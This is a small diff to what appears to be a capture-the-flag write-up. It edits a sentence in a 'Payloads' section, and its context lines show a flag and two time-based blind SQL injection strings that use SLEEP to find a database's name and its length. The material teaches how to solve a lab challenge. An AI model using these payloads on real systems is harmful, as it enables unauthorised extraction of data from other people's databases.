@@ -229,7 +229,7 @@ Flag is <code>bucket{h4d35t_sql1_2b05bc}</code>.
 
 ## Payloads
 
-These payloads should be used in loops with different values.
+These payloads should be used in loops with different values (as shown in the codes above).
 
 + <code>' OR 1=IF((SELECT LENGTH(database()))=numeric_value, SLEEP(5), 1)#</code> for the length of the database name<br>
 + <code>' OR 1=IF((SELECT database()) LIKE 'substring%', SLEEP(5), 1)#</code> for database name<br>
